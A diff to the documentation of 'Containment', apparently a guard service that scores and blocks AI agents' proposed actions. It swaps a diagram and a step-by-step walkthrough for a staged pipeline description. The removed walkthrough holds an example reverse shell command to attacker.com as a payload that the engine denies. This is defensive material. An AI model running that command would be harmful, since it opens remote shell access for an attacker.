@@ -40,81 +40,69 @@ This sample audit report showcases:
 
 Containment uses a layered architecture to secure agent execution environments. The web application is built on TanStack React Start, and the core Guard Engine runs statelessly on an edge-ready Nitro server. The application state, policy parameters, and security logs are managed by Supabase PostgreSQL database tables.
 
-```mermaid
-graph TD
-    %% Styling
-    classDef ui fill:#1e293b,stroke:#3b82f6,stroke-width:2px,color:#f8fafc;
-    classDef srv fill:#0f172a,stroke:#a855f7,stroke-width:2px,color:#f8fafc;
-    classDef store fill:#064e3b,stroke:#10b981,stroke-width:2px,color:#f8fafc;
-    classDef agent fill:#7c2d12,stroke:#f97316,stroke-width:2px,color:#f8fafc;
-
-    subgraph Client [Client Interface]
-        FE[React 19 / TanStack Router Web App]:::ui
-    end
-
-    subgraph Server [Nitro Server Tier]
-        API[API Router / Server Functions]:::srv
-        GE[Guard Engine - engine.ts]:::srv
-    end
-
-    subgraph Storage [Supabase Storage]
-        DB[(PostgreSQL / Audit Tables)]:::store
-        AUTH{Supabase Auth}:::store
-    end
-
-    subgraph Production [Agent Environment]
-        P_AGENT[Autonomous AI Agent / Application]:::agent
-    end
-
-    %% Interactions
-    FE --> |1. User requests/policy change| API
-    P_AGENT --> |2. Proposed action payload| API
-    API --> |3. Resolve security policies| GE
-    GE --> |4. Log verdict and payload| DB
-    API --> |5. Verify credentials| AUTH
-    DB --> |6. Populate real-time dashboard| FE
-```
+![Containment System Architecture](https://i.imgur.com/dO3sqcK.png)
 <p align="center"><em>Figure 1: Containment Real-Time Protection System Architecture Diagram</em></p>
 
 ### Flow-by-Flow Explanation
 
-To understand how Containment intercepts threats, consider a typical workflow when a deployed AI agent proposes a security-sensitive command:
+This section maps directly to the Containment architectural pipeline, detailing how policy ingestion occurs and how individual agent actions are intercepted, evaluated, and secured in real-time.
 
-1. **Step 1: Action Proposal**
-   The autonomous AI agent determines its next action (e.g., executing a command or downloading a file). Instead of executing the action immediately, the agent framework intercepts the call and sends a JSON payload to the Containment API:
-   ```json
-   {
-     "type": "shell",
-     "command": "bash -i >& /dev/tcp/attacker.com/4444",
-     "agent_id": "production-agent-01"
-   }
-   ```
+---
 
-2. **Step 2: API Request & Authentication**
-   The request is received by the secure REST endpoint `/api/public/v1/guard`. The server extracts the authentication key from the `x-guard-key` header, hashes it using SHA-256, and queries the Supabase database to verify the key and retrieve its associated workspace security policy.
+#### Stage 1: Repository-Guided Policy Setup (One-Time)
+This stage establishes the initial boundary configuration by digesting repository metadata to build a context-aware defense posture.
+1. **Ingest Repository**: The user provides a target repository URL. The backend fetches repository file hierarchies, project configurations, dependency listings, and tool configurations.
+2. **Parse Codebase Structure**: The system parses the codebase structure to automatically discover legitimate operational boundaries, identifying sensitive directories, configurations, and network dependencies.
+3. **Agent-Optimized Policy Generation (YAML/JSON)**: Based on discovered constraints, the policy engine constructs an agent-optimized rule profile (using JSON or YAML schemas) specifying allowed commands, network domain allowlists, write-permitted paths, and restricted tools.
+4. **Policy Sign-off & Storage (Supabase/Postgres)**: The administrator reviews, tweaks, and signs off on the policy. The approved configuration is version-controlled and written directly into the Supabase PostgreSQL database under the active workspace security policy.
 
-3. **Step 3: Core Evaluation**
-   The payload is sent to the stateless **Guard Engine (`engine.ts`)**. The engine performs key normalization steps, such as removing escaped characters and resolving directory paths. It then runs high-severity detection rules against the normalized input. In this case, the command triggers the `SHELL_REVERSE_SHELL` rule with a severe risk score of 100.
+---
 
-4. **Step 4: Verdict Computation**
-   The system compares the calculated risk score against your active policy thresholds:
-   - **Risk Score >= Deny Threshold (default 60)**: Returns `DENY`.
-   - **Risk Score >= Approval Threshold (default 35)**: Returns `HOLD` and routes the action to the human approval queue.
-   - **Risk Score < Approval Threshold**: Returns `ALLOW`.
+#### Stage 2: Runtime Guard Pipeline (Every Action)
+For every single action an active agent attempts, the Runtime Guard Pipeline acts as an inline interceptor.
+1. **Agent Action Interception (Public Guard API)**: Prior to tool or shell execution, the agent's framework intercepts the proposed action and dispatches a JSON payload containing the action category, parameters, context, and client metadata to the public Containment REST API (`/api/public/v1/guard`).
+2. **Cryptographic Verification (HMAC/SHA-256)**: The gateway extracts the authentication credentials or signatures (e.g., from custom security headers) and performs rapid, secure verification against hashed keys in the Database.
+3. **Content Parsing & Context Assembly**: Once verified, the engine normalizes the payload (e.g., stripping escape codes, resolving relative file paths) and matches the incoming payload parameters with the current active version of the workspace policy.
 
-5. **Step 5: Logging & Audit Trail**
-   The calculated verdict, risk score, triggered rules, and raw action payload are logged to the `decisions` table in the database. The API key's `last_used_at` timestamp is updated automatically.
+---
 
-6. **Step 6: Enforced Response**
-   The API returns a response containing the verdict and triggered rules to the caller:
-   ```json
-   {
-     "verdict": "deny",
-     "risk_score": 100,
-     "summary": "Blocked: reverse shell attempt."
-   }
-   ```
-   The agent framework receives this response and blocks the execution, preventing the escape attempt from running.
+#### Stage 3: Decision & Enforcement
+At the heart of the firewall is the real-time evaluation of risk scoring and rule matching.
+1. **Policy Constraint Matching**: The parsed action parameters are checked against the deterministic policy boundaries (e.g., matching a executed shell command against binary deny-lists or checking an outgoing IP request against domain allowlists).
+2. **Risk Scoring & LLM Guard Analysis**: The deterministic rules generate an base risk score (0-100). Simultaneously, an optional advisory LLM Guard layer analyzes the action's intent to detect advanced obfuscations, prompt injection, and semantic threats, providing an independent risk evaluation.
+3. **Real-Time Interdiction Decision (Allow, Deny, or Escalate/Redact)**: A final action verdict is computed instantly by comparing calculated risk scores against policy thresholds:
+   - **ALLOW**: If the score is below the manual approval threshold, the action is approved.
+   - **DENY**: If the score exceeds the deny threshold, the execution is immediately blocked.
+   - **ESCALATE / REDACT**: Borderline scores halt execution and route the request to a human-in-the-loop approval queue.
+
+---
+
+#### Stage 4: Audit & Evidence Storage
+After a decision is rendered, Containment logs detailed artifacts to guarantee complete traceability.
+1. **Encrypt Action & Evidence**: The raw action payload, associated runtime variables, and triggered rule profiles are encrypted to prevent unauthorized modification or exposure of sensitive command payloads.
+2. **Write Immutable Ledger Log**: The outcome is committed to the PostgreSQL-backed audit ledger, creating a tamper-resistant record of the decision verdict, specific rule match details, and chronological timestamps.
+3. **Sync with Management Console**: Real-time subscriptions push the new ledger record immediately to open dashboard sessions, providing administrators with live timeline updates.
+
+---
+
+#### Management Console Interactions
+Administrators manage policy state and supervise operations through a secure browser interface:
+* **Dashboard**: Displays high-level analytics, including real-time risk ratios, blocked threat counts, and active traffic graphs.
+* **Policies**: Allows users to dynamically edit, save, and release newer versions of workspace boundaries with seamless rollbacks.
+* **Approvals**: A central holding interface where paused actions are reviewed, contextual AI recommendations are generated, and operators approve or reject executions.
+* **Audit History**: A complete list of all decisions, equipped with advanced filters for forensic investigation.
+* **Reports**: Compiles runtime statistics and generates compliance audit documents.
+* **Settings**: Manages API keys, workspace credentials, integration preferences, and user roles.
+
+---
+
+#### Outputs & Insights
+The final stage yields actionable reports and diagnostic telemetry for downstream security teams:
+* **Decision Timeline**: An interactive chronological log mapping the agent's activities and interventions step-by-step.
+* **Policy Version Info**: Real-time indicators of which version of the guard policy evaluated and governed each specific action.
+* **Risk Findings**: Aggregated vulnerability highlights, detailing patterns of prompt injection or system traverse attempts.
+* **PDF Report**: Fully styled, branded audit documents compiling workspace configurations, metrics, and detailed decision ledgers for compliance sign-off.
+* **Evidence Export**: Machine-readable JSON audits and log exports available for SIEM or external analysis pipelines.
 
 ---
 
